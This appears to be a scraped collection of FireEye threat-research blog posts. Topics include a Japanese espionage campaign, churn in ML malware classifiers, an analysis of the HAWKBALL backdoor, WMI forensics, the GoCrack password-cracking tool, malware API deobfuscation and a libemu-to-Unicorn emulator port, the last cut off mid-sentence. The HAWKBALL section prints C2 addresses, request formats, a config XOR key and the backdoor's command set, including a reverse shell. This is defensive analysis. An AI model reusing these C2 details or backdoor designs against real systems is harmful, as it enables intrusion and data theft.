incidents involving SWC and exploitation of the Flash vulnerability CVE-2015-5119 lured victims with phishing emails. Additionally, the limited popularity of the niche site also contributes to our suspicion that phishing emails may have been the lure, and not incidental web browsing. Malware Overlap with Other Chinese Threat Groups We believe that this is a concerted campaign against Japanese companies given the nature of the SWC. The use of SOGU malware and dissemination method is consistent with the tactics of Chinese APT groups that we track. Chinese APT groups have previously targeted the affected Japanese organizations, but we have yet to confirm which group is responsible for this campaign. Why Japan? In this case, we do not have enough information to discern specifically what the threat actors may have been pursuing. The Japanese economy’s technological innovation and strengths in high-tech and precision goods have attracted the interest of multiple Chinese APT groups, who almost certainly view Japanese companies as a rich source of intellectual property and competitive intelligence. The Japanese government and military organizations are also frequent targets of cyber espionage.[1]  Japan’s economic influence, alliance with the United States, regional disputes, and evolving defense policies make the Japanese government a dedicated target of foreign intelligence. Recommendations FireEye maintains endpoint and network detection for CVE-2015-5122 and the backdoor used in this campaign. FireEye products and services identify this activity as SOGU/Kaba within the user interface. Additionally, we highly recommend: Applying Adobe’s newest patch for Flash immediately; Querying for additional activity by the indicators from the compromised Japanese websites and the SOGU malware callbacks; Blocking CnC addresses via outbound communications; and Scope the environment to prepare for incident response. [1] Humber, Yuriy and Gearoid Reidy. “Yahoo Hacks Highlight Cyber Flaws Japan Rushing to Twart.” BloombergBusiness. 8 July 2014. http://www.bloomberg.com/news/articles/2014-07-08/yahoo-hacks-highlight-cyber-flaws-japan-rushing-to-thwart Japanese Ministry of Defense. “Trends Concerning Cyber Space.” Defense of Japan 2014.  http://www.mod.go.jp/e/publ/w_paper/pdf/2014/DOJ2014_1-2-5_web_1031.pdf LAC Corporation. “Cyber Grid View, Vol. 1.” http://www.lac.co.jp/security/report/pdf/apt_report_vol1_en.pdf Otake, Tomoko. “Japan Pension Service hack used classic attack method.” Japan Times. 2 June 2015. http://www.japantimes.co.jp/news/2015/06/02/national/social-issues/japan-pension-service-hack-used-classic-attack-method/ Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/06/june_2_6_12_2015con.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-06-17",
                    "source": "www.fireeye.com"
                },
                "text": "Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/04/churning-out-machine-learning-models-handling-changes-in-model-predictions.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-04-09",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Machine learning (ML) is playing an increasingly important role in cyber security. Here at FireEye, we employ ML for a variety of tasks such as: antivirus , malicious PowerShell detection , and correlating threat actor behavior . While many people think that a data scientist’s job is finished when a model is built, the truth is that cyber threats constantly change and so must our models. The initial training is only the start of the process and ML model maintenance creates a large amount of technical debt. Google provides a helpful introduction to this topic in their paper “Machine Learning: The High-Interest Credit Card of Technical Debt. ” A key concept from the paper is the principle of CACE : change anything, change everything . Because ML models deliberately find nonlinear dependencies between input data, small changes in our data can create cascading effects on model accuracy and downstream systems that consume those model predictions. This creates an inherent conflict in cyber security modeling: (1) we need to update models over time to adjust to current threats and (2) changing models can lead to unpredictable outcomes that we need to mitigate. Ideally, when we update a model, the only change in model outputs are improvements, e.g. fixes to previous errors. Both false negatives (missing malicious activity) and false positives (alerts on benign activity), have significant impact and should be minimized. Since no ML model is perfect, we mitigate mistakes with orthogonal approaches: whitelists and blacklists, external intelligence feeds, rule-based systems, etc. Combining with other information also provides context for alerts that may not otherwise be present. However, CACE ! These integrated systems can suffer unintended side effects from a model update. Even when the overall model accuracy has increased, individual changes in model output are not guaranteed to be improvements. Introduction of new false negatives or false positives in an updated model, called churn , creates the potential for new vulnerabilities and negative interactions with cyber security infrastructure that consumes model output. In this article, we discuss churn, how it creates technical debt when considering the larger cyber security product, and methods to reduce it. Prediction Churn Whenever we retrain our cyber security-focused ML models, we need to able to calculate and control for churn. Formally, prediction churn is defined as the expected percent difference between two different model predictions (note that prediction churn is not the same as customer churn, the loss of customers over time, which is the more common usage of the term in business analytics). It was originally defined by Cormier et al . for a variety of applications. For cyber security applications, we are often concerned with just those differences where the newer model performs worse than the older model. Let’s define bad churn when retraining a classifier as the percentage of misclassified samples in the test set which the original model correctly classified. Churn is often a surprising and non-intuitive concept. After all, if the accuracy of our new model is better than the accuracy of our old model, what’s the problem? Consider the simple linear classification problem of malicious red squares and benign blue circles in Figure 1. The original model, A, makes three misclassifications while the newer model, B, makes only two errors. B is the more accurate model. Note, however, that B introduces a new mistake in the lower right corner, misclassifying a red square as benign. That square was correctly classified by model A and represents an instance of bad churn. Clearly, it’s possible to reduce the overall error rate while introducing a small number of new errors which did not exist in the older model. Figure 1: Two linear classifiers with errors highlighted in orange. The original classifier A has lower accuracy than B. However, B introduces a new error in the bottom right corner. Practically, churn introduces two problems in our models. First, bad churn may require changes to whitelist/blacklists used in conjunction with ML models. As we previously discussed, these are used to handle the small but inevitable number of incorrect classifications. Testing on large repositories of data is necessary to catch such changes and update associated whitelists and blacklists. Second, churn may create issues for other ML models or rule-based systems which rely on the output of the ML model. For example, consider a hypothetical system which evaluates URLs using both a ML model and a noisy blacklist. The system generates an alert if P(URL = ‘malicious’) > 0.9 or P(URL = ‘malicious’) > 0.5 and the URL is on the blacklist After retraining, the distribution of P(URL=‘malicious’) changes and all .com domains receive a higher score. The alert rules may need to be readjusted to maintain the required overall accuracy of the combined system. Ultimately, finding ways of reducing churn minimizes this kind of technical debt. Experimental Setup We’re going to explore churn and churn reduction techniques using EMBER, an open source malware classification data set. It consists of 1.1 million PE files first seen in 2017, along with their labels and features. The objective is to classify the files as either goodware or malware. For our purposes we need to construct not one model, but two, in order to calculate the churn between models. We have split the data set into three pieces: January through August is used as training data September and October are used to simulate running the model in production and retraining (test 1 in Figure 2). November and December are used to evaluate the models from step 1 and 2 (test 2 in Figure 2). Figure 2: A comparison of our experimental setup versus the original EMBER data split. EMBER has a ten-month training set and a two-month test set. Our setup splits the data into three sets to simulate model training, then retraining while keeping an independent data set for final evaluation. Figure 2 shows our data split and how it compares to the original EMBER data split. We have built a LightGBM classifier on the training data, which we’ll refer to as the baseline model. To simulate production testing, we run the baseline model on test 1 and record the FPs and FNs. Then, we retrain our model using both the training data and the FPs/FNs from test 1. We’ll refer to this model as the standard retrain. This is a reasonably realistic simulation of actual production data collection and model retraining. Finally, both the baseline model and the standard retrain are evaluated on test 2. The standard retrain has a higher accuracy than the baseline on test 2, 99.33% vs 99.10% respectively. However, there are 246 misclassifications made by the retrain model that were not made by the baseline or 0.12% bad churn. Incremental Learning Since our rationale for retraining is that cyber security threats change over time, e.g. concept drift, it’s a natural suggestion to use techniques like incremental learning to handle retraining. In incremental learning we take new data to learn new concepts without forgetting (all) previously learned concepts. That also suggests that an incrementally trained model may not have as much churn, as the concepts learned in the baseline model still exist in the new model. Not all ML models support incremental learning, but linear and logistic regression, neural networks, and some decision trees do. Other ML models can be modified to implement incremental learning. For our experiment, we incrementally trained the baseline LightGBM model by augmenting the training data with FPs and FNs from test 1 and then trained an additional 100 trees on top of the baseline model (for a total of 1,100 trees). Unlike the baseline model we use regularization (L2 parameter of 1.0); using no regularization resulted in overfitting to the new points. The incremental model has a bad churn of 0.05% (113 samples total) and 99.34% accuracy on test 2. Another interesting metric is the model’s performance on the new training data; how many of the baseline FPs and FNs from test 1 does the new model fix? The incrementally trained model correctly classifies 84% of the previous incorrect classifications. In a very broad sense, incrementally training on a previous model’s mistake provides a “patch” for the “bugs” of the old model. Churn-Aware Learning Incremental approaches only work if the features of the original and new model are identical. If new features are added, say to improve model accuracy, then alternative methods are required. If what we desire is both accuracy and low churn, then the most straightforward solution is to include both of these requirements when training. That’s the approach taken by Cormier et al., where samples received different weights during training in such a way as to minimize churn. We have made a few deviations in our approach: (1) we are interested in reducing bad churn (churn involving new misclassifications) as opposed to all churn and (2) we would like to avoid the extreme memory requirements of the original method. In a similar manner to Cormier et al., we want to reduce the weight, e.g. importance, of previously misclassified samples during training of a new model. Practically, the model sees making the same mistakes as the previous model as cheaper than making a new mistake. Our weighing scheme gives all samples correctly classified by the original model a weight of one and all other samples have a weight of: w = α – β |0.5 – P old ( χ i )|, where P old ( χ i ) is the output of the old model on sample χ i and α , β are adjustable hyperparameters. We train this reduced churn operator model (RCOP) using an α of 0.9, a β of 0.6 and the same training data as the incremental model. RCOP produces 0.09% bad churn, 99.38% accuracy on test 2. Results Figure 3 shows both accuracy and bad churn of each model on test set 2. We compare the baseline model, the standard model retrain, the incrementally learned model and the RCOP model. Figure 3: Bad churn versus accuracy on test set 2. Table 1 summarizes each of these approaches, discussed in detail above. Name Trained on Method Total # of trees Baseline train LightGBM 1000 Standard retrain train + FPs/FNs from baseline on test 1 LightGBM 1100 Incremental model train + FPs/FNs from baseline on test 1 Trained 100 new trees, starting from the baseline model 1100 RCOP train + FPs/FNs from baseline on test 1 LightGBM with altered sample weights 1100 Table 1: A description of the models tested The baseline model has 100 fewer trees than the other models, which could explain the comparatively reduced accuracy. However, we tried increasing the number of trees which resulted in only a minor increase in accuracy of < 0.001%. The increase in accuracy for the non-baseline methods is due to the differences in data set and training methods. Both incremental training and RCOP work as expected producing less churn than the standard retrain, while showing accuracy improvements over the baseline. In general, there is usually a trend of increasing accuracy being correlated with increasing bad churn: there is no free lunch. That increasing accuracy occurs due to changes in the decision boundary, the more improvement the more changes occur. It seems reasonable the increasing decision boundary changes correlate with an increase in bad churn although we see no theoretical justification for why that must always be the case. Unexpectedly, both the incremental model and RCOP produce more accurate models with less churn than the standard retrain. We would have assumed that given their additional constraints both models would have less accuracy with less churn. The most direct comparison is RCOP versus the standard retrain. Both models use identical data sets and model parameters, varying only by the weights associated with each sample. RCOP reduces the weight of incorrectly classified samples by the baseline model. That reduction is responsible for the improvement in accuracy. A possible explanation of this behavior is mislabeled training data. Multiple authors have suggested identifying and removing points with label noise, often using the misclassifications of a previously trained model to identify those noisy points. Our scheme, which reduces the weight of those points instead of removing them, is not dissimilar to those other noise reduction approaches which could explain the accuracy improvement. Conclusion ML models experience an inherent struggle: not retraining means being vulnerable to new classes of threats, while retraining causes churn and potentially reintroduces old vulnerabilities. In this blog post, we have discussed two different approaches to modifying ML model training in order to reduce churn: incremental model training and churn-aware learning. Both demonstrate effectiveness in the EMBER malware classification data set by reducing the bad churn, while simultaneously improving accuracy. Finally, we also demonstrated the novel conclusion that reducing churn in a data set with label noise can result in a more accurate model. Overall, these approaches provide low technical debt solutions to updating models that allow data scientists and machine learning engineers to keep their models up-to-date against the latest cyber threats at minimal cost. At FireEye, our data scientists work closely with the FireEye Labs detection analysts to quickly identify misclassifications and use these techniques to reduce the impact of churn on our customers. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/06/government-in-central-asia-targeted-with-hawkball-backdoor.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-06-05",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs recently observed an attack against the government sector in Central Asia. The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802. HAWKBALL is a backdoor that attackers can use to collect information from the victim, as well as to deliver payloads. HAWKBALL is capable of surveying the host, creating a named pipe to execute native Windows commands, terminating processes, creating, deleting and uploading files, searching for files, and enumerating drives. Figure 1 shows the decoy used in the attack. Figure 1: Decoy used in attack The decoy file, doc.rtf (MD5: AC0EAC22CE12EAC9EE15CA03646ED70C), contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP% with the name 8.t. This shellcode is decrypted in memory through EQENDT32.EXE. Figure 2 shows the decryption mechanism used in EQENDT32.EXE. Figure 2: Shellcode decryption routine The decrypted shellcode is dropped as a Microsoft Word plugin WLL (MD5: D90E45FBF11B5BBDCA945B24D155A4B2) into C:\\Users\\ADMINI~1\\AppData\\Roaming\\Microsoft\\Word\\STARTUP (Figure 3). Figure 3: Payload dropped as Word plugin Technical Details DllMain of the dropped payload determines if the string WORD.EXE is present in the sample’s command line. If the string is not present, the malware exits. If the string is present, the malware executes the command RunDll32.exe < C:\\Users\\ADMINI~1\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\hh14980443.wll, DllEntry> using the WinExec() function. DllEntry is the payload’s only export function. The malware creates a log file in %TEMP% with the name c3E57B.tmp. The malware writes the current local time plus two hardcoded values every time in the following format: <Month int>/<Date int> <Hours>:<Minutes>:<Seconds>\\t<Hardcoded Digit>\\t<Hardcoded Digit>\\n Example: 05/22 07:29:17 4          0 This log file is written to every 15 seconds. The last two digits are hard coded and passed as parameters to the function (Figure 4). Figure 4: String format for log file The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation. The decrypted data contains command and control (C2) information as well as a mutex string used during malware initialization. Figure 5 shows the decryption routine and decrypted config file. Figure 5: Config decryption routine The IP address from the config file is written to %TEMP%/3E57B.tmp with the current local time. For example: 05/22 07:49:48 149.28.182.78. Mutex Creation The malware creates a mutex to prevent multiple instances of execution. Before naming the mutex, the malware determines whether it is running as a system profile (Figure 6). To verify that the malware resolves the environment variable for %APPDATA%, it checks for the string config/systemprofile. Figure 6: Verify whether malware is running as a system profile If the malware is running as a system profile, the string d0c from the decrypted config file is used to create the mutex. Otherwise, the string _cu is appended to d0c and the mutex is named d0c_cu (Figure 7). Figure 7: Mutex creation After the mutex is created, the malware writes another entry in the logfile in %TEMP% with the values 32 and 0. Network Communication HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP. The C2 server is obtained from the decrypted config file, as shown in Figure 5. The network request is formed with hard-coded values such as User-Agent. The malware also sets the other fields of request headers such as: Content-Length: <content_length> Cache-Control: no-cache Connection: close The malware sends an HTTP GET request to its C2 IP address using HTTP over port 443. Figure 8 shows the GET request sent over the network. Figure 8: Network request The network request is formed with four parameters in the format shown in Figure 9. Format = \"?t=%d&&s=%d&&p=%s&&k=%d\" Figure 9: GET request parameters formation Table 1 shows the GET request parameters. Value Information T Initially set to 0 S Initially set to 0 P String from decrypted config at 0x68 k The result of GetTickCount() Table 1: GET request parameters If the returned response is 200, then the malware sends another GET request (Figure 10) with the following parameters (Figure 11). Format = \"?e=%d&&t=%d&&k=%d\" Figure 10: Second GET request Figure 11: Second GET request parameters formation Table 2 shows information about the parameters. Value Information E Initially Set to 0 T Initially set to 0 K The result of GetTickCount() Table 2: Second GET request parameters If the returned response is 200, the malware examines the Set-Cookie field. This field provides the Command ID. As shown in Figure 10, the field Set-Cookie responds with ID=17. This Command ID acts as the index into a function table created by the malware. Figure 12 shows the creation of the virtual function table that will perform the backdoor’s command. Figure 12: Function table Table 3 shows the commands supported by HAWKBALL. Command Operation Performed 0 Set URI query string to value 16 Unknown 17 Collect system information 18 Execute a provided argument using CreateProcess 19 Execute a provided argument using CreateProcess and upload output 20 Create a cmd.exe reverse shell, execute a command, and upload output 21 Shut down reverse shell 22 Unknown 23 Shut down reverse shell 48 Download file 64 Get drive geometry and free space for logical drives C-Z 65 Retrieve information about provided directory 66 Delete file 67 Move file Table 3: HAWKBALL commands Collect System Information Command ID 17 indexes to a function that collects the system information and sends it to the C2 server. The system information includes: Computer Name User Name IP Address Active Code Page OEM Page OS Version Architecture Details (x32/x64) String at 0x68 offset from decrypted config file This information is retrieved from the victim using the following WINAPI calls: Format = \"%s;%s;%s;%d;%d;%s;%s %dbit\" GetComputerNameA GetUserNameA Gethostbyname and inet_ntoa GetACP GetOEMPC GetCurrentProcess and IsWow64Process Figure 13: System information The collected system information is concatenated together with a semicolon separating each field: WIN732BIT-L-0;Administrator;10.128.62.115;1252;437;d0c;Windows 7 32bit This information is encrypted using an XOR operation. The response from the second GET request is used as the encryption key. As shown in Figure 10, the second GET request responds with a 4-byte XOR key. In this case the key is 0xE5044C18 . Once encrypted, the system information is sent in the body of an HTTP POST. Figure 14 shows data sent over the network with the POST request. Figure 14: POST request In the request header, the field Cookie is set with the command ID of the command for which the response is sent. As shown in Figure 14, the Cookie field is set with ID=17, which is the response for the previous command. In the received response, the next command is returned in field Set-Cookie. Table 4 shows the parameters of this POST request. Parameter Information E Initially set to 0 T Decimal form of the little-endian XOR key K The result of GetTickCount() Table 4: POST request parameters Create Process The malware creates a process with specified arguments. Figure 15 shows the operation. Figure 15: Command create process Delete File The malware deletes the file specified as an argument. Figure 16 show the operation. Figure 16: Delete file operation Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls: FindFirstFileW FindNextFileW FileTimeToLocalFileTime FiletimeToSystemTime Figure 17 shows the API used for collecting information. Figure 17: Get directory information Get Disk Information This command retrieves the drive information for drives C through Z along with available disk space for each drive. Figure 18: Retrieve drive information The information is stored in the following format for each drive: Format = \"%d+%d+%d+%d;\" Example: \"8+512+6460870+16751103;\" The information for all the available drives is combined and sent to the server using an operation similar to Figure 14. Anti-Debugging Tricks Debugger Detection With PEB The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. Figure 19: Retrieve value from PEB NtQueryInformationProcess The malware uses the NtQueryInformationProcess API to detect if it is being debugged. The following flags are used: Passing value 0x7 to ProcessInformationClass: Figure 20: ProcessDebugPort verification Passing value 0x1E to ProcessInformationClass: Figure 21: ProcessDebugFlags verification Passing value 0x1F to ProcessInformationClass: Figure 22: ProcessDebugObject Conclusion HAWKBALL is a new backdoor that provides features attackers can use to collect information from a victim and deliver new payloads to the target. At the time of writing, the FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat. We advise that all industries remain on alert, though, because the threat actors involved in this campaign may eventually broaden the scope of their current targeting. Indicators of Compromise (IOC) MD5 Name AC0EAC22CE12EAC9EE15CA03646ED70C Doc.rtf D90E45FBF11B5BBDCA945B24D155A4B2 hh14980443.wll Network Indicators 149.28.182[.]78:443 149.28.182[.]78:80 http://149.28.182[.]78/?t=0&&s=0&&p=wGH^69&&k=<tick_count> http://149.28.182[.]78/?e=0&&t=0&&k=<tick_count> http://149.28.182[.]78/?e=0&&t=<int_xor_key>&&k=<tick_count> Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2) FireEye Detections MD5 Product Signature Action AC0EAC22CE12EAC9EE15CA03646ED70C FireEye Email Security FireEye Network Security FireEye Endpoint Security FE_Exploit_RTF_EQGEN_7 Exploit.Generic.MVX Block D90E45FBF11B5BBDCA945B24D155A4B2 FireEye Email Security FireEye Network Security FireEye Endpoint Security Malware.Binary.Dll FE_APT_Backdoor_Win32_HawkBall_1 APT.Backdoor.Win.HawkBall Block Acknowledgement Thank you to Matt Williams for providing reverse engineering support. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/08/windows_managementi.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-08-08",
                    "source": "www.fireeye.com"
                },
                "text": "Windows Management Instrumentation (WMI) is a remote management framework that enables the collection of host information, execution of code, and provides an eventing system that can respond to operating system events in real time. FireEye has recently seen a surge in attacker use of WMI to carry out objectives such as system reconnaissance, remote code execution, persistence, lateral movement, covert data storage, and VM detection. Defenders and forensic analysts have largely remained unaware of the value of WMI due to its relative obscurity and completely undocumented file format. After extensive reverse engineering, the FireEye FLARE team has documented the WMI repository file format in detail, developed libraries to parse it, and formed a methodology for finding evil in the repository. The FLARE team is now publishing a whitepaper that takes a deep dive into the architecture of WMI, reveals case studies in attacker use of WMI in the wild, describes WMI attack mitigation strategies, and shows how to mine its repository for forensic artifacts. The document also demonstrates how to detect attacker activity in real-time by tapping into the WMI eventing system. WMI is a valuable asset not just for system administrators and attackers, but equally so for defenders and forensic analysts. Download a copy of the whitepaper today! Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/10/gocrack-managed-password-cracking-tool.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-10-30",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye's Innovation and Custom Engineering (ICE) team released a tool today called GoCrack that allows red teams to efficiently manage password cracking tasks across multiple GPU servers by providing an easy-to-use, web-based real-time UI (Figure 1 shows the dashboard) to create, view, and manage tasks. Simply deploy a GoCrack server along with a worker on every GPU/CPU capable machine and the system will automatically distribute tasks across those GPU/CPU machines. Figure 1: Dashboard As readers of this blog probably know, password cracking tools are an effective way for security professionals to test password effectiveness, develop improved methods to securely store passwords, and audit current password requirements. Some use cases for a password cracking tool can include cracking passwords on exfil archives, auditing password requirements in internal tools, and offensive/defensive operations. We’re releasing GoCrack to provide another tool for distributed teams to have in their arsenal for managing password cracking and recovery tasks. Keeping in mind the sensitivity of passwords, GoCrack includes an entitlement-based system that prevents users from accessing task data unless they are the original creator or they grant additional users to the task. Modifications to a task, viewing of cracked passwords, downloading a task file, and other sensitive actions are logged and available for auditing by administrators. Engine files (files used by the cracking engine) such as Dictionaries, Mangling Rules, etc. can be uploaded as “Shared”, which allows other users to use them in task yet do not grant them the ability to download or edit. This allows for sensitive dictionaries to be used without enabling their contents to be viewed. Figure 2 shows a task list, Figure 3 shows the “Realtime Status” tab for a task, and Figure 4 shows the “Cracked Passwords” tab. Figure 2: Task Listing Figure 3: Task Status Figure 4: Cracked Passwords Tab GoCrack is shipping with support for hashcat v3.6+, requires no external database server (via a flat file), and includes support for both LDAP and database backed authentication. In the future, we plan on adding support for MySQL and Postgres database engines for larger deployments, ability to manage and edit files in the UI, automatic task expiration, and greater configuration of the hashcat engine. We’re shipping with Dockerfile’s to help jumpstart users with GoCrack. The server component can run on any Linux server with Docker installed. Users with NVIDIA GPUs can use NVIDIA Docker to run the worker in a container with full access to the GPUs. GoCrack is available immediately for download along with its source code on the project's GitHub page . If you have any feature requests, questions, or bug reports, please file an issue in GitHub. ICE is a small, highly trained, team of engineers that incubate and deliver capabilities that matter to our products, our clients and our customers. ICE is always looking for exceptional candidates interested in solving challenging problems quickly. If you’re interested, check out FireEye careers . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/06/remote-symbol-resolution.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-06-21",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction The following blog discusses a couple of common techniques that malware uses to obscure its access to the Windows API. In both forms examined, analysts must calculate the API start address and resolve the symbol from the runtime process in order to determine functionality. After introducing the techniques, we present an open source tool we developed that can be used to resolve addresses from a process running in a virtual machine by an IDA script. This gives us an efficient way to quickly add readability back into the disassembly. Techniques When performing an analysis, it is very common to see malware try to obscure the API it uses. As a malware analyst, determining which API is used is one of the first things we must resolve in order to determine the capabilities of the code. Two common obfuscations we are going to look at in this blog are encoded function pointer tables and detours style hook stubs. In both of these scenarios the entry point to the API is not directly visible in the binary. For an example of what we are talking about, consider the code in Figure 1, which was taken from a memory dump of xdata crypto ransomware sample C6A2FB56239614924E2AB3341B1FBBA5. Figure 1: API obfuscation code from a crypto ransomware sample In Figure 1, we see one numeric value being loaded into eax, XORed against another, and then being called as a function pointer. These numbers only make sense in the context of a running process. We can calculate the final number from the values contained in the memory dump, but we also need a way to know which API address it resolved to in this particular running process. We also have to take into account that DLLs can be rebased due to conflicts in preferred base address, and systems with ASLR enabled. Figure 2 shows one other place we can look to see where the values were initially set. Figure 2: Crypto malware setting obfuscated function pointer from API hash In this case, the initial value is loaded from an API hash lookup – again not of immediate value. Here we have hit a crossroad, with multiple paths we can take to resolve the problem. We can search for a published hash list, extract the hasher and build our own database, or figure out a way to dynamically resolve the decoded API address. Before we choose which path to take, let us consider another sample. Figure 3 shows code from Andromeda sample, 3C8B018C238AF045F70B38FC27D0D640. Figure 3: API redirection code from an Andromeda sample This code was found in a memory injection. Here we can see what looks to be a detours style trampoline, where the first instruction was stolen from the actual Windows API and placed in a small stub with an immediate jump taken back to the original API + x bytes. In this situation, the malware accesses all of the API through these stubs and we have no clear resolution as to which stub points where. From the disassembly we can also see that the stolen instructions are of variable length. In order to resolve where these functions go, we would have to: enumerate all of the stubs calculate how many bytes are in the first instruction extract the jmp address subtract the stolen byte count to find the API entrypoint resolve the calculated address for this specific process instance rename the stub to a meaningful value In this sample, looking for cross references on where the value is set does not yield any results. Here we have two manifestations of essentially the same problem. How do we best resolve calculated API addresses and add this information back into our IDA database? One of the first techniques used was to calculate all of the final addresses, write them to a binary file, inject the data into the process, and examine the table in the debugger (Figure 4). Since the debugger already has a API address look up table, this gives a crude yet quick method to get the information we need. Figure 4: ApiLogger from iDefense MAP injecting a data file into a process and examining results in debugger From here we can extract the resolved symbols and write a script to integrate them into our IDB. This works, but it is bulky and involves several steps. Our Tool What we really want is to build our own symbol lookup table for a process and create a streamlined way to access it from our scripts. The first question is: How can we build our own lookup table of API addresses to API names? To resolve this information, we need to follow some steps: enumerate all of the DLLs loaded into a process for each DLL, walk the export table and extract function name and RVA calculate API entrypoint based on DLL base address and export RVA build a lookup table based on all of this information While this sounds like a lot of work, libraries are already available that handle all of the heavy lifting. Figure 5 shows a screenshot of a remote lookup tool we developed for such occasions. Figure 5: Open source remote lookup application In order to maximize the benefits of this type of tool, the tool must be efficient. What is the best way to interface with this data? There are several factors to consider here, including how the data is submitted, what input formats are accepted, and how well the tool can be integrated with the flow of the analysis process. The first consideration is how we interface with it. For maximum flexibility, three methods were chosen. Lookups can be submitted: individually via textbox in bulk by file or over the network by a remote client In terms of input formats, it accepts the following: hex memory address case insensitive API name dll_name@ordinal dll_name.export_name The tool output is in the form of a CSV list that includes address, name, ordinal, and DLL. With the base tool capabilities in place, we still need an efficient streamlined way to use it during our analysis. The individual lookups are nice for offhand queries and testing, but not in bulk. The bulk file lookup is nice on occasion, but it still requires data export/import to integrate results with your IDA database. What is really needed is a way to run a script in IDA, calculate the API address, and then resolve that address inline while running an IDA script. This allows us to rename functions and pointers on the fly as the script runs all in one shot. This is where the network client capability comes in. Again, there are many approaches to this. Here we chose to integrate a network client into a beta of IDA Jscript (Figure 6). IDA Jscript is an open source IDA scripting tool with IDE that includes syntax highlighting, IntelliSense, function prototype tooltips, and debugger. Figure 6: Open source IDA Jscript decoding and resolving API addresses In this example we see a script that decodes the xdata pointer table, resolves the API address over the network, and then generates an IDC script to rename the pointers in IDA. After running this script and applying the results, the decompiler output becomes plainly readable (Figure 7). Figure 7: Decompiler output from the xdata sample after symbol resolution Going back to the Andromeda sample, the API information can be restored with the brief idajs script shown in Figure 8. Figure 8: small idajs script to remotely resolve and rename Andromeda API hook stubs For IDAPython users, a python remote lookup client is also available. Conclusion It is common for malware to use techniques that mask the Windows API being used. These techniques force malware analysts to have to extract data from runtime data, calculate entry point addresses, and then resolve their meaning within the context of a particular running process. In previous techniques, several manual stages were involved that were bulky and time intensive. This blog introduces a small simple open source tool that can integrate well into multiple IDA scripting languages. This combination allows analysts streamlined access to the data required to quickly bypass these types of obfuscations and continue on with their analysis. We are happy to be able to open source the remote lookup application so that others may benefit and adapt it to their own needs. Sample network clients have been provided for Python, C#, D, and VB6. Download a copy of the tool today. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2017/04/libemu-unicorn-compatability-layer.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2017-04-17",
                    "source": "www.fireeye.com"
                },
                "text": "In this post we are going to take a quick look at what it takes to write a libemu compatibility layer for the Unicorn engine. In the course of this work, we will also import the libemu Win32 environment to run under Unicorn. For a bit of background, libemu is a lightweight x86 emulator written in C by Paul Baecher and Markus Koetter. It was released in 2007 and includes a built-in Win32 environment that allows shellcodes to resolve API at runtime. The library also provides end users with a convenient way to receive callbacks when API functions are hit. The original project supported 5 Windows dlls, 51 hooks and 234 opcodes all wrapped in a tight 1mb package. Unfortunately it is no longer being updated. In late 2015, we saw the Unicorn engine project released by Nguyen Anh Quynh and Dang Hoang Vu. This project takes the processor emulators from QEMU and wraps them into an easy to use library. Unicorn, however, does not provide a Win32 layer. As an experiment, we were curious to see what it would take to bring the libemu Win32 environment into Unicorn. This task actually turned out to be quite simple since it was nicely self contained. In the process of exploring this it also made sense to write a basic shim layer to support the libemu API and translate its inner workings over to Unicorn. Lets start with the common libemu API: The API is actually very similar to Unicorn: The major differences are that Unicorn does everything through an opaque uc_engine* handle, while libemu uses a series of structs such as emu, emu_cpu, and emu_memory: In general, the emu and emu_memory structures are passed directly as arguments to API wrappers such as emu_cpu_get, emu_memory_get and the emu_memory_read/write functions. There is one common case of direct member access to the emu_cpu structure that requires some special attention. This structure gives the user direct read/write access to the emulator’s virtual processor and is commonly utilized by user code. Examples to support include: The next task was to see if we could mimic the direct access to the emu_cpu elements as if they were static struct fields. Here we enter the world of C++ operator overloading. With these tasks complete, porting existing code from libemu over to Unicorn should be a pretty straightforward task. In Figure 1 we see an initial test, we put together that includes the Win32 environment, shim layer, several API hooks and a hard coded payload. Figure 1: Initial test of the libemu Win32 environment and hooks running under Unicorn With this working, the next stage was to try it out against a larger code base. Here we imported the userhooks.cpp from scdbg, an extension of the libemu sctest that includes some 250 API hooks. As it turns out, very few changes were required to get it working. In Figure 2, we can see the results of testing it against a fairly complex shellcode that: allocates virtual memory copies code to the new alloc creates a new thread downloads an executable checks the registry for the presence of Antivirus software Note that while this shellcode would normally do process injection, scdbg handles it all inline for simplified analysis. Figure 2: Complex shellcode running with hooks imported from scdbg Another large feature to test was the scdbg debug shell. When testing software in an emulated environment, having interactive debug tools available is extremely handy. Figure 3 shows an example of setting a breakpoint, single stepping, and examining memory of code running in the emulator. Figure 3: Imported 